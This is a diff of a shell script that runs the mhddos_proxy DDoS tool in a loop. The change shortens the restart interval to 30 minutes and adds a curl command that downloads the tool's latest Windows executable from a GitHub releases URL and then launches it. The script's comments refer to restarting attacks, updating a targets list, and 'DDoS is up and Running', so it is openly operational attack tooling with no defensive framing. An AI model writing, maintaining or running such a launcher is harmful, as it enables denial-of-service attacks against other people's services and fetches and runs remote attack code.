@@ -23,10 +23,10 @@ curl -Lo mhddos_proxy https://github.com/porthole-ascend-cinnamon/mhddos_proxy_r
 sleep 2
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mFiles installed successfully\033[1;0m\n\n"
 
-restart_interval="6h"
+restart_interval="30m"
 
 
-# Restart attacks and update targets list every 20 minutes
+# Restart attacks and update targets list every 30 minutes
 while [ 1 == 1 ]
 do		
 	cd ~/runner_for_windows
@@ -43,8 +43,9 @@ do
 	fi
 
 	cd ~
+	curl -Lo mhddos_proxy https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_win.exe
+
 	./mhddos_proxy&
-	
 	
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update in $restart_interval ...\033[1;0m"
 	sleep $restart_interval
